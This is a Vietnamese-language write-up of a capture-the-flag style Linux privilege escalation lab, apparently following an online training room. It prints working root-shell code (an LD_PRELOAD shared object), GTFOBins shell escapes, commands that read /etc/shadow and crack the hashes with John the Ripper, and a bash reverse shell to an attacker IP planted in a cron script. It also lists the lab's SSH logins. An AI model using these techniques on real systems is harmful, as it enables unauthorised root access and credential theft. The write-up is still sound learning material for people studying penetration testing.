# Linux Privilege Escalation

**Task 1: Introduction**

Leo thang đặc quyền là một quá trình phụ thuộc vào cấu hình hệ thống mục tiêu. Các yếu tố như phiên bản kernel, ứng dụng cài đặt, ngôn ngữ lập trình hỗ trợ và mật khẩu người dùng khác đều ảnh hưởng đến việc đạt được root shell. 

**Task 2: What is Privilege Escalation?**

Privilege Escalation là quá trình chuyển từ tài khoản có quyền hạn thấp lên tài khoản có quyền cao hơn. Điều này thường xảy ra khi khai thác lỗ hổng, lỗi thiết kế hoặc cấu hình sai trong hệ điều hành hay ứng dụng để truy cập trái phép vào tài nguyên bị hạn chế.

=> Tại sao điều này quan trọng? 

Trong kiểm thử thâm nhập, hiếm khi có được quyền truy cập ban đầu với quyền quản trị ngay lập tức. Privilege Escalation giúp đạt quyền quản trị hệ thống, cho phép:

- Đặt lại mật khẩu

- Bỏ qua kiểm soát truy cập để truy cập dữ liệu bảo vệ

- Chỉnh sửa cấu hình phần mềm

- Duy trì quyền truy cập lâu dài

- Thay đổi quyền của người dùng hiện tại hoặc mới

- Thực thi lệnh quản trị

![img](29)

**Task 3: Enumeration**

Thông tin SSH: 

    Username: karen
    Password: Password1

Enumeration - Việc liệt kê là bước đầu tiên phải thực hiện khi có quyền truy cập vào bất kỳ hệ thống nào.

Có thể truy cập hệ thống bằng cách khai thác một lỗ hổng nghiêm trọng dẫn đến quyền truy cập cấp gốc hoặc chỉ tìm được cách gửi lệnh bằng tài khoản có đặc quyền thấp

Một số lệnh tìm hiểu về OS:  

- ***hostname***: Lệnh hostname sẽ trả về tên máy chủ của máy mục tiêu

- ***uname -a***: Lệnh in thông tin hệ thống cung cấp cho chúng tôi chi tiết bổ sung về kernel được hệ thống sử dụng

- ***/proc/version***: có thể cung cấp thông tin về phiên bản kernel và dữ liệu bổ sung chẳng hạn như trình biên dịch (ví dụ: GCC) có được cài đặt hay không.

- ***/etc/issue***: chứa một số thông tin về hệ điều hành nhưng có thể dễ dàng tùy chỉnh hoặc thay đổi.

**Lệnh ps**

Lệnh ps là một cách hiệu quả để xem các tiến trình đang chạy trên hệ thống Linux.

Output của lệnh ***ps*** (Process Status) sẽ hiển thị như sau:

- PID: The process ID (unique to the process) - ID tiến trình (duy nhất cho tiến trình)

- TTY: Terminal type used by the user - Loại thiết bị đầu cuối được người dùng sử dụng

- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for) - Lượng thời gian CPU được sử dụng bởi tiến trình (đây KHÔNG phải là thời gian mà tiến trình này đã chạy)

- CMD: The command or executable running (will NOT display any command line parameter) - Lệnh hoặc tệp thực thi đang chạy (sẽ KHÔNG hiển thị bất kỳ tham số dòng lệnh nào)

Lệnh ***"ps"*** cung cấp một số tùy chọn hữu ích:

- ps -A: xem tất cả tiến trình đang chạy

- ps axjf: Xem cây quy trình (xem sự hình thành cây cho đến khi ps axjf được chạy bên dưới)

![img](30)

- ps aux: Tùy chọn aux sẽ hiển thị các tiến trình cho all users (a), hiển thị user đã khởi chạy quy trình (u) và hiển thị các tiến trình không được gắn vào thiết bị đầu cuối (x).

**Lệnh env**

Lệnh env sẽ hiển thị các biến môi trường.

![img](31)


***sudo -l***: Lệnh sudo -l có thể được sử dụng để liệt kê tất cả các lệnh mà có thể chạy bằng sudo.

***ls***: Trong khi tìm kiếm các vectơ leo thang đặc quyền tiềm năng, hãy nhớ luôn sử dụng lệnh ls với tham số -la. 

![img](32)


***id***: Lệnh id sẽ cung cấp cái nhìn tổng quan chung về cấp đặc quyền của người dùng và tư cách thành viên nhóm. 

![img](33)

***/etc/passwd***: Đọc tệp /etc/passwd có thể là một cách dễ dàng để khám phá người dùng trên hệ thống.

![img](34)

=> Làm sạch output: 

![img](35)

![img](36)

**Lệnh history**: Nhìn vào các lệnh trước đó bằng lệnh history có thể cho một số ý tưởng về hệ thống đích

**Lệnh ifconfig**: thông tin về các giao diện mạng của hệ thống. 

![img](37)

![img](38)

**Lệnh netstat**: có thể được sử dụng với một số tùy chọn khác nhau để thu thập thông tin về các kết nối hiện có.

- netstat -a: hiển thị tất cả các cổng nghe và các kết nối được thiết lập.

- netstat -at hoặc netstat -au:  cũng có thể được sử dụng để liệt kê các giao thức TCP hoặc UDP tương ứng.

- netstat -l: liệt kê các cổng ở chế độ "nghe". Các cổng này mở và sẵn sàng chấp nhận các kết nối đến, sử dụng với tùy chọn "t" để chỉ liệt kê các cổng đang nghe bằng giao thức TCP 

![img](39)

- netstat -s: liệt kê số liệu thống kê sử dụng mạng theo giao thức (bên dưới) Điều này cũng có thể được sử dụng với các tùy chọn -t hoặc -u để giới hạn output với một giao thức cụ thể.

![img](40)

- netstat -tp: liệt kê các kết nối với tên dịch vụ và thông tin PID.

![img](41)

=> Kết hợp với tùy chọn ***-l*** để liệt kê các cổng đang nghe:

![img](42)

Cột PID trống vì tiến trình thuộc sở hữu của người khác, nhưng nếu chạy với quyền root: 

![img](43)

- netstat -i: Hiển thị số liệu thống kê giao diện mạng

![img](44)

- netstat -ano có thể được chia nhỏ như sau:

    - -a: Hiển thị tất cả các sockets

    - -n: Không giải quyết tên

    - -o: Hiển thị bộ hẹn giờ

![img](45)

**Lệnh find**

Việc tìm kiếm hệ thống mục tiêu để biết thông tin quan trọng và các vectơ leo thang đặc quyền tiềm ẩn có thể mang lại kết quả

Một số ví dụ: 

- ***find . -name flag1.txt***: tìm file có tên "flag1.txt" trong thư mục hiện tại

- ***find /home -name flag1.txt***: tìm tên tệp "flag1.txt" trong thư mục /home

- ***find / -type d -name config***: tìm directory có tên config trong "/"

- ***find / -type f -perm 0777***:  tìm các file có quyền 777 (tất cả người dùng có thể đọc, ghi và thực thi các tệp)

- ***find / -perm a=x***: tìm tập tin thực thi

- ***find /home -user frank***: tìm tất cả các file cho người dùng "frank" trong "/home"

- ***find / -mtime 10***: tìm các tập tin đã được sửa đổi trong 10 ngày qua

- ***find / -atime 10***: tìm các tập tin được truy cập trong 10 ngày qua

- ***find / -cmin -60***: tìm các tập tin đã thay đổi trong vòng một giờ qua (60 phút)

...

Lệnh này cũng có thể được sử dụng với dấu (+) và (-) để chỉ định tệp lớn hơn hoặc nhỏ hơn kích thước đã cho.

![img](46)

Nên sử dụng lệnh ***"find"*** với ***"-type f 2>/dev/null"*** để chuyển hướng lỗi sang ***"/dev/null"*** và có kết quả đầu ra rõ ràng hơn.

![img](47)

Các folders và files có thể được ghi vào hoặc thực thi từ:

- ***find / -writable -type d 2>/dev/null***: Tìm world-writeable folders

- ***find / -perm -222 -type d 2>/dev/null***: Tìm world-writeable folders

- ***find / -perm -o w -type d 2>/dev/null***: Tìm world-writeable folders

- ***find / -perm -o x -type d 2>/dev/null***: Tìm world-executable folders

Tìm các công cụ phát triển và ngôn ngữ được hỗ trợ:

- ***find / -name perl***

- ***find / -name python***

- ***find / -name gcc***

- ***find / -perm -u=s -type f 2>/dev/null***: Tìm tệp có bit SUID, cho phép chạy tệp với mức đặc quyền cao hơn người dùng hiện tại

**General Linux Commands**

![img](48)

![img](49)

Kiểm tra python version: 

![img](50)

**Task 4: Automated Enumeration Tools**

Một số công cụ có thể giúp tiết kiệm thời gian trong quá trình liệt kê, nhưng chúng có thể bỏ lỡ một số vectơ leo thang đặc quyền. Vì vậy, hãy sử dụng chúng như một hỗ trợ thay vì phụ thuộc hoàn toàn.

Môi trường hệ thống đích sẽ quyết định công cụ có thể chạy. Ví dụ, nếu hệ thống không có Python, không thể chạy các công cụ viết bằng Python. Do đó, nên làm quen với nhiều công cụ thay vì chỉ dựa vào một.

Một số công cụ liệt kê Linux phổ biến:

- LinPeas: GitHub
- LinEnum: GitHub
- LES (Linux Exploit Suggester): GitHub
- Linux Smart Enumeration: GitHub
- Linux Priv Checker: GitHub

**Task 5: Privilege Escalation: Kernel Exploits**

Leo thang đặc quyền lý tưởng sẽ dẫn đến quyền root, có thể đạt được bằng cách khai thác lỗ hổng hoặc truy cập vào tài khoản có nhiều đặc quyền hơn. Nếu không có lỗ hổng trực tiếp, quá trình này thường dựa vào cấu hình sai và quyền hạn lỏng lẻo.

**Khai thác Kernel**

Kernel quản lý giao tiếp giữa bộ nhớ và ứng dụng, đòi hỏi đặc quyền cao. Khai thác kernel thành công thường dẫn đến quyền root. Các bước thực hiện:

1. Xác định phiên bản kernel

2. Tìm mã khai thác phù hợp

3. Chạy khai thác

Tuy nhiên, khai thác kernel có thể gây lỗi hệ thống, nên cân nhắc trước khi thực hiện trong thử nghiệm thâm nhập.

**Nguồn tham khảo**

- Google, Exploit-DB, searchsploit để tìm mã khai thác

- CVE Details (cvedetails.com) để tra cứu lỗ hổng

- Linux Exploit Suggester (LES) có thể hỗ trợ nhưng có thể tạo kết quả sai

**Lưu ý**:

- Chọn đúng phiên bản kernel khi tìm khai thác
- Hiểu rõ cách hoạt động của mã khai thác trước khi chạy
- Một số khai thác có thể gây thay đổi hệ thống không thể đảo ngược
- Một số khai thác cần tương tác thêm sau khi thực thi
- Chuyển mã khai thác sang hệ thống đích bằng SimpleHTTPServer (Python) và wget

![img](51)

Download file và dùng lệnh

    gcc 37292.c -o ofc

Sử dụng trình biên dịch GCC (GNU Compiler Collection) để biên dịch mã nguồn C trong tệp 37292.c thành một tệp thực thi:

![img](52)

Dùng lệnh ***sudo python3 -m http.server*** để thiết lập kết nối và lắng nghe

![img](53)

Sau đó bên máy karen, cd vào /tmp và dùng lệnh wget http://10.8.13.3:8000/ofc để tải file về:

![img](54)

(Cần cấp quyền thực thi cho script bên máy karen)

Thực thi file ofc: 

![img](55)

**Task 6: Privilege Escalation: Sudo**

Lệnh sudo theo mặc định cho phép chạy một chương trình với quyền root. 

**Leverage application functions - Tận dụng các chức năng ứng dụng**

Apache2 có một tùy chọn hỗ trợ tải các tệp cấu hình thay thế (-f : chỉ định ServerConfigFile thay thế).

![img](56)

Việc tải tệp /etc/shadow bằng tùy chọn này sẽ dẫn đến thông báo lỗi bao gồm dòng đầu tiên của tệp /etc/shadow.

**Leverage LD_PRELOAD**

Trên một số hệ thống, có thể thấy tùy chọn môi trường LD_PRELOAD.

![img](57)

LD_PRELOAD cho phép mọi chương trình sử dụng thư viện dùng chung. Nếu tùy chọn "env_keep" được bật, có thể tạo thư viện dùng chung để tải và thực thi trước khi chương trình chạy. Tuy nhiên, LD_PRELOAD bị bỏ qua nếu ID người dùng thực khác với ID hiệu quả.

**Các bước thực hiện**

- Kiểm tra LD_PRELOAD (với tùy chọn env_keep)
- Viết mã C đơn giản và biên dịch thành tệp .so (shared object)
- Chạy chương trình với quyền sudo và thiết lập LD_PRELOAD trỏ đến tệp .so

Mã C đơn giản tạo ra một root shell có thể được viết như sau: 

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>


    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

Lưu mã này dưới dạng shell.c và biên dịch nó bằng gcc thành tệp đối tượng dùng chung bằng các tham số sau: 

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles

![img](68)

Bây giờ có thể sử dụng shared object này khi khởi chạy bất kỳ chương trình nào mà người dùng của có thể chạy với sudo

Cần chạy chương trình bằng cách chỉ định tùy chọn LD_PRELOAD như sau:

    sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

Điều này sẽ tạo ra một shell có quyền root.

![img](69)

=> Question: 

![img](70)


Phát hiện ra có thể sử dụng 3 lệnh với sudo

Trong đó có thể dùng sudo nano

Truy cập ***gtfobins*** - website cung cấp shell code để bypass

Tìm kiếm nano:

![img](71)

Trên máy karen, sử dụng ***sudo nano***:

![img](72)

Sau đó nhấn CTRL R, CTRL X để chuyển sang chế độ Command to execute

![img](73)

Dán nội dung ***reset; sh 1>&0 2>&0***:

![img](74)

Kiểm tra id 

![img](75)

![img](76)

Tệp /etc/shadow chứa thông tin về người dùng của hệ thống Linux, mật khẩu của họ và các quy định về thời gian cho mật khẩu của họ. Khi tạo hoặc thay đổi mật khẩu trong Linux , hệ thống sẽ hash* (băm) và lưu trữ nó trong tệp shadow.

![img](77)

**Task 7: Privilege Escalation: SUID**

Trong Linux, quyền kiểm soát tệp và người dùng đóng vai trò quan trọng trong quản lý đặc quyền. Ngoài quyền đọc (r), ghi (w), thực thi (x) thông thường, Linux còn có SUID (Set-user ID) và SGID (Set-group ID), cho phép tệp thực thi với quyền của chủ sở hữu hoặc nhóm thay vì của người chạy.

Các tệp có SUID/SGID thường hiển thị ký tự "s" trong quyền của chúng. Để liệt kê các tệp này, có thể sử dụng:

    find / -type f -perm -04000 -ls 2>/dev/null

![img](78)

Khai thác SUID bằng GTFOBins

Một thực hành hữu ích là so sánh danh sách tệp tìm được với GTFOBins (gtfobins.github.io). Nhấp vào nút SUID để lọc các tệp nhị phân có thể khai thác khi có bit SUID. Cũng có thể sử dụng danh sách lọc sẵn

![img](79)

Ví dụ, nếu nano có bit SUID nhưng không có khai thác trực tiếp trên GTFOBins, cần tìm cách tận dụng những phát hiện nhỏ để leo thang đặc quyền theo cách gián tiếp, tương tự như trong các tình huống thực tế.

Bộ bit SUID cho trình soạn thảo văn bản nano cho phép tạo, chỉnh sửa và đọc tệp bằng đặc quyền của chủ sở hữu tệp.

Nano được sở hữu bởi root, điều này có thể có nghĩa là có thể đọc và chỉnh sửa các tệp ở mức đặc quyền cao hơn mức mà người dùng hiện tại

Ở giai đoạn này, có hai tùy chọn cơ bản để tăng đặc quyền: đọc tệp /etc/shadow hoặc thêm người dùng của vào /etc/passwd.

**Đọc file /etc/shadow**

Sau khi xác định nano có bit SUID, có thể lợi dụng nó để đọc /etc/shadow:

    nano /etc/shadow

Tệp này chứa mật khẩu băm của người dùng hệ thống. Để bẻ khóa mật khẩu, cần kết hợp với /etc/passwd bằng công cụ unshadow:

    unshadow passwd.txt shadow.txt > passwords.txt

![img](80)

Sau đó, sử dụng John the Ripper với danh sách từ phù hợp để giải mã mật khẩu

**Thêm Người Dùng Root Trực Tiếp**

Thay vì bẻ khóa mật khẩu, có thể thêm một tài khoản root mới:

1. Tạo giá trị băm cho mật khẩu bằng OpenSSL trên Kali Linux

        openssl passwd -1 -salt my_salt my_password

2. Thêm tài khoản mới vào /etc/passwd:

![img](81)

Sau khi user được thêm vào (lưu ý cách sử dụng ***root:/bin/bash*** để cung cấp root shell), chuyển sang người dùng này và hy vọng sẽ có quyền root.

![img](82)

=> Question: 

![img](83)

Dùng lệnh ***find / -type f -perm -0400 -ls 2>/dev/null*** để liệt kê files có bit SUID hoặc SGID được set: 

![img](84)

=> Tìm thấy tệp công cụ ***/usr/bin/base64***

Trong hệ điều hành Kali Linux (hoặc bất kỳ hệ điều hành Linux nào), hai tệp hoặc công cụ như /usr/bin/base64 và /etc/shadow không trực tiếp liên quan đến nhau, nhưng chúng có thể được sử dụng kết hợp trong một số kịch bản bảo mật hoặc tấn công liên quan đến mật khẩu.

Trong các cuộc tấn công hoặc nghiên cứu bảo mật, kẻ tấn công có thể mã hóa hash mật khẩu từ /etc/shadow bằng Base64 để dễ dàng truyền tải hoặc lưu trữ.

=> Thử search base64 trên gtfobins: 

![img](85)

Ở đây nói là: Nếu tệp nhị phân có bộ bit SUID, nó sẽ không loại bỏ các đặc quyền nâng cao và có thể bị lạm dụng để truy cập vào hệ thống tệp, leo thang hoặc duy trì quyền truy cập đặc quyền dưới dạng cửa sau SUID

Thử lệnh sau trên máy karen: 

    LFILE=/etc/shadow
    /usr/bin/base64 “$LFILE” | base64 --decode

![img](86)

=> tìm ra hash password của user2

Lưu hash này vào 1 file .txt: 

    echo <user2_hash_pass> > hash.txt

Sử dụng John the RIpper thử crack pass này:

    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    john --show hash.txt

![img](87)

=> Tìm ra pass: Password1

Để đọc nội dung file flag3.txt, tiếp tục sử dụng LFILE sau khi tìm ra path của file nằm ở /home/ubuntu

![img](88)

**Task 8: Privilege Escalation: Capabilities**

Capabilities giúp quản lý đặc quyền ở cấp độ chi tiết hơn, thay vì cấp quyền root hoàn toàn cho một tiến trình hoặc nhị phân. Ví dụ, nếu một nhà phân tích SOC cần chạy công cụ yêu cầu mở kết nối mạng, quản trị viên có thể gán capabilities thay vì cấp quyền sudo. Điều này giúp công cụ hoạt động mà không cần quyền người dùng cao hơn.

**Kiểm tra Capabilities**

Trang man capabilities cung cấp thông tin chi tiết về cách sử dụng. Để liệt kê các khả năng đã được gán cho tệp nhị phân, sử dụng getcap:

![img](89)

Lệnh này sẽ tìm kiếm tất cả các tệp có capabilities trên hệ thống.

Tìm trên gtfobins, nhận thấy rằng vim có thể được sử dụng với lệnh và payload sau:

![img](90)

Thao tác này sẽ khởi chạy root shell:

![img](91)

=> QUestion:

SỬ dụng lệnh ***getcap -r / 2>/dev/null***

![img](92)

=> Có 6 tệp nhị phân được set capabilities trong đó có view

Thử search view và tìm trong phần Capabilities trên gtfobins: 

![img](93)

Ở đây ghi là: Nếu tệp nhị phân có bộ khả năng CAP_SETUID của Linux hoặc được thực thi bởi một tệp nhị phân khác có bộ khả năng, thì nó có thể được sử dụng làm cửa sau để duy trì quyền truy cập đặc quyền bằng cách thao tác tiến trình UID của chính nó.

Copy lệnh ***./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'***

Thay py thành py3 và path đến view, lệnh trở thành: 

***/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'***

Sau khi chạy lệnh, truy cập được với quyền root: 

![img](94)

Thử tìm flag4.txt

![img](95)

**Task 9: Privilege Escalation: Cron Jobs**

Cron jobs là các tác vụ được lập lịch chạy tự động theo thời gian định sẵn. Chúng chạy với quyền của chủ sở hữu thay vì người dùng hiện tại. Nếu một cron job chạy với quyền root và có thể chỉnh sửa tệp lệnh của nó, thì mã tùy chỉnh sẽ được thực thi với quyền root.

**Xác định Cron Jobs chạy với quyền Root**

Cấu hình cron được lưu trong các crontabs. Mỗi người dùng có thể có một crontab file, ngay cả khi họ không đăng nhập. Mục tiêu là tìm một cron job của root và thay thế tập lệnh của nó.

Để kiểm tra các cron jobs trên toàn hệ thống:

    cat /etc/crontab

![img](96)

Tạo một reverse shell, hy vọng là có quyền root.

Luôn ưu tiên bắt đầu các reverse shell vì không muốn làm tổn hại đến tính toàn vẹn của hệ thống trong quá trình tham gia thử nghiệm thâm nhập thực tế.

File sẽ trông như này: 

![img](97)

Bây giờ sẽ chạy một trình lắng nghe trên máy tấn công để nhận kết nối đến.

![img](98)

Crontab luôn đáng được kiểm tra vì đôi khi nó có thể dẫn đến các vectơ leo thang đặc quyền dễ dàng.

Ví dụ tình huống: 

1. Quản trị viên hệ thống cần chạy tập lệnh đều đặn.

2. Họ tạo ra một cron job để thực hiện việc này

3. Sau một thời gian, tập lệnh trở nên vô dụng và họ xóa nó

4. Họ không dọn dẹp cron job có liên quan

=> dẫn đến việc khai thác tiềm năng tận dụng các cron job.

![img](99)

Ví dụ trên cho thấy tình huống tương tự khi tập lệnh Antivirus.sh đã bị xóa nhưng cron job vẫn tồn tại. 

Trong trường hợp này, có thể tạo một tập lệnh có tên "antivirus.sh" trong thư mục chính của người dùng và nó sẽ được chạy định kỳ bởi cron tab.

![img](100)

Bên máy lắng nghe có thể truy cập quyền root: 

![img](101)

=> Question: 

Sử dụng lệnh cat /etc/crontab để xem bao nhiêu cron jobs do người dùng xác định trên hệ thống đích:

![img](102)

=> 4 crob jobs

Có vẻ có thể truy cập /home/karen/backup.sh, kiểm tra: 

![img](103)

cron jobs /tmp/test.py

Kiểm tra: 

![img](104)

=> ko có test.py, có vẻ admin đã xóa nhưng không xóa cron job liên quan.

Khai thác file test.py. 

=> Tạo 1 file như vậy trong thư mục /tmp. 

Trên máy tấn công, tạo kênh lắng nghe: 

![img](105)

Truy cập /home/karen và chỉnh sửa shell backup.sh để tạo 1 reverse shell:

![img](106)

Thay nội dung hiện tại: 

![img](107)

Tìm kiếm payload reverse shell trên github: 

![img](108)

=> Nội dung mới có dạng: ***bash -i >& /dev/tcp/10.0.0.1/4242 0>&1***

Thay IP thành IP và Port thành IP và port của máy tấn công đang lắng nghe, payload trở thành: 

***bash -i >& /dev/tcp/10.8.13.3/4545 0>&1***

Thêm quyền thực thi cho shell backup.sh:

![img](109)

Sau đó chờ đợi bên kênh lắng nghe: 

![img](110)

=> đã có quyền root

![img](111)

Đọc nội dung file /etc/shadow:

![img](112)

=> tìm được hash pass của matt

![img](113)

giải mã và tìm được pass là: 123456

**Task 10: Privilege Escalation: PATH**

Trong Linux, PATH là một biến môi trường xác định nơi hệ điều hành tìm kiếm các tệp thực thi. Nếu một thư mục mà người dùng có quyền ghi nằm trong PATH, có thể chèn một tập lệnh độc hại để thay thế ứng dụng hợp lệ, từ đó thực thi mã tùy chỉnh với quyền cao hơn.

Thông thường, PATH sẽ trông như thế này:

![img](114)

=> Nếu gõ "thm" vào dòng lệnh, đây là những vị trí Linux sẽ tìm kiếm một tệp thực thi có tên là thm.

Đối với mục đích demo, sử dụng script bên dưới:

![img](115)

Tập lệnh này cố gắng khởi chạy một tệp nhị phân hệ thống có tên là "thm" nhưng ví dụ này có thể dễ dàng được sao chép bằng bất kỳ tệp nhị phân nào.

Biên dịch tệp này thành tệp thực thi và đặt bit SUID.

![img](116)

Sau khi thực thi "path" sẽ tìm kiếm một tệp thực thi có tên "thm" bên trong các thư mục được liệt kê trong PATH.

Nếu bất kỳ thư mục có thể ghi nào được liệt kê trong PATH, có thể tạo một tệp nhị phân có tên thm trong thư mục đó và để “path” chạy nó. Khi bit SUID được đặt, tệp nhị phân này sẽ chạy với quyền root.

Có thể thực hiện tìm kiếm đơn giản các thư mục có thể ghi bằng lệnh ***"find / -writable 2>/dev/null"***.

![img](117)

So sánh điều này với PATH sẽ giúp tìm thấy các thư mục có thể sử dụng.

![img](118)

![img](119)

Thật không may, các thư mục con trong /usr không thể ghi được

Thư mục dễ ghi vào hơn có lẽ là /tmp. Tại thời điểm này vì /tmp không có trong PATH nên sẽ cần thêm nó. Lệnh ***"export PATH=/tmp:$PATH"*** thực hiện việc này.

![img](120)

Tại thời điểm này, script path cũng sẽ tìm trong thư mục /tmp để tìm tệp thực thi có tên "thm". Tạo lệnh này khá dễ dàng bằng cách sao chép /bin/bash dưới dạng "thm" trong thư mục /tmp.

![img](121)

![img](122)

=> Question: 

Sử dụng lệnh để tìm các file có quyền ghi: 

    find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

![img](123)

=> Tìm ra thư mục lẻ /home/murdoch

Thử cd vào thư mục này: 

![img](124)

test có vẻ là 1 dạng file thực thi của thm.py

Đọc nội dung file thm.py: 

![img](125)

=> Script sẽ tìm kiếm file có quyền thực thi có tên thm trong biến $PATH

=> Cần tạo file thm và 1 path mới vào biến $PATH

Tạo thêm 1 path /tmp vào biến $PATH:

![img](126)

cd vào /tmp

![img](127)

=> Tạo 1 file nhị phân “thm” được đặt bit SUID trong /tmp

![img](128)

Thêm nội dung sau vào script thm này: 

![img](129)

Cấp quyền thực thi cho file thm:

![img](130)

sau đó cd lại vào /home/murdoch, thực thi script test và có quyền root: 

![img](131)

![img](132)

**Task 11: Privilege Escalation: NFS**

Không chỉ giới hạn trong quyền truy cập nội bộ, việc leo thang đặc quyền cũng có thể khai thác thư mục chia sẻ và giao diện quản lý từ xa như SSH, Telnet để giành quyền root.

**Các Vectơ Phổ Biến**

- SSH Private Key: Nếu tìm thấy khóa riêng SSH của root, có thể kết nối trực tiếp qua SSH thay vì tìm cách leo thang từ tài khoản hiện tại.

- Network Shell (Misconfigured Netcat, Ncat, etc.): Một số hệ thống có thể chạy network shell không an toàn, đặc biệt là trong môi trường CTF hoặc hệ thống sao lưu mạng.

- NFS (Network File Sharing): Cấu hình NFS (Network File Sharing) được lưu trong tệp /etc/exports. Tệp này được tạo trong quá trình cài đặt máy chủ NFS và người dùng thường có thể đọc được.

![img](133)

Yếu tố quan trọng đối với vectơ leo thang đặc quyền này là tùy chọn "no_root_squash". 

Theo mặc định, NFS sẽ thay đổi người dùng root thành nfsnobody và loại bỏ bất kỳ tệp nào hoạt động với quyền root. 

Nếu tùy chọn "no_root_squash" xuất hiện trên một chia sẻ có quyền ghi, có thể tạo một tệp thực thi với bộ bit SUID và chạy nó trên hệ thống đích.

Bắt đầu bằng cách liệt kê mountable shares - các chia sẻ có thể gắn kết từ máy tấn công: 

![img](134)

Gắn một trong các chia sẻ "no_root_squash" vào máy tấn công và bắt đầu xây dựng tệp thực thi.

![img](135)

Vì có thể đặt các bit SUID, một tệp thực thi đơn giản sẽ chạy /bin/bash trên hệ thống đích sẽ thực hiện công việc.

![img](136)

Khi biên dịch mã, đặt bit SUID.

![img](137)

Cả hai tệp (nfs.c và nfs đều có trên hệ thống đích. Đã xử lý phần mounted share - chia sẻ được gắn kết nên không cần phải chuyển chúng).

![img](138)

=> Question: 

Tìm kiếm mountable shares trên máy karen: 

![img](139)

=> 3 mountable shares

=> 3 share có tùy chọn “no_root_squash”

Kiểm tra trên máy attack kali, liệt kê mountable shares:

![img](140)

Trên máy karen, kiểm tra 3 path này:

![img](141)

=> không truy cập được backup và matt là nơi chứa flag

Trên máy attack, truy cập vào thư mục mnt, tạo dir mới có tên là jrpentestthm:

![img](142)

Sử dụng lệnh 

    mount -o rw 10.10.242.181:/home/ubuntu/sharedfolder /mnt/jrpentestthm

Lệnh này sẽ:

- Gắn thư mục từ xa /home/ubuntu/sharedfolder từ máy chủ có IP 10.10.242.181 vào thư mục /mnt/jrpentestthm trên máy cục bộ.

- Cho phép chế độ đọc-ghi (read-write) với thư mục được gắn.

![img](143)

Sau khi gán thư mục từ máy tấn công sang máy karen thành công:

![img](144)

cd vào jrpentestthm và tạo shell c:

![img](145)

Payload được lấy từ đây:

![img](146)

![img](147)

Chuyển file nfs.c thành dạng thực thi nfs:

![img](148)

Cấp quyền cho shell nfs và gán SUID:

![img](149)

Kiểm tra bên máy karen: 

![img](150)

Sau đó thực thi ./nfs và tìm ra flag:

![img](151)

**Task 12: Capstone Challenge**

Thông tin đăng nhập SSH:

Username: leonard

Password: Penny123

Thử tìm kiếm các file có quyền ghi: 

![img](152)

Thử tìm kiếm: 

***find / -type f -perm -04000 -ls 2>/dev/null***  sẽ liệt kê các tệp có bit SUID hoặc SGID được đặt.

![img](153)

Để ý thấy /usr/bin/base64 có bit SUID được đặt => có thể lợi dụng để thực thi shell giúp leo thang đặc quyền.

Thử cd vào home và kiểm tra

![img](154)

Có thể flag1 nằm trong missy và flag2 nằm trong rootflag directory

Tìm kiếm SUID trên gtfobins: 

![img](155)

    LFILE=/home/missy/flag1.txt
    /usr/bin/base64 “$LFILE” | base64 --decode

![img](156)

=> Không tìm được. 

Thử đọc file /etc/shadow:

![img](157)

Tiếp tục thử: 

    LFILE=/etc/shadow
    /usr/bin/base64 “$LFILE” | base64 --decode

![img](158)

=> Tìm ra hash pass của missy. Thử giải mã:

![img](159)

=> pass của missy là Password1

Đăng nhập tài khoản missy: 

![img](160)

Tìm kiếm file flag1.txt: 

![img](161)

Khi khai thác file /etc/shadow, tìm được: 

![img](162)

=> Mật khẩu của account root. Thử giải mã: 

![img](163)

Tìm ra password của root. Login vào tk root:

![img](164)














































